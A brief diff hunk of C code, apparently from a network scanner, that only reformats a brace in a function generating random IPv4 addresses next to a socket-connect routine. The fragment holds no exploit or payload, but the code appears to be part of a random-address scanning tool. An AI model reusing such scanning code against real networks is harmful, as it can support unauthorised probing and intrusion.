@@ -673,8 +673,7 @@ static void setup_connection(struct scanner_connection *conn)
     connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
 }
 
-static ipv4_t get_random_ip(void)
-{
+static ipv4_t get_random_ip(void) {
     uint32_t tmp;
     uint8_t o1, o2, o3, o4;
     do
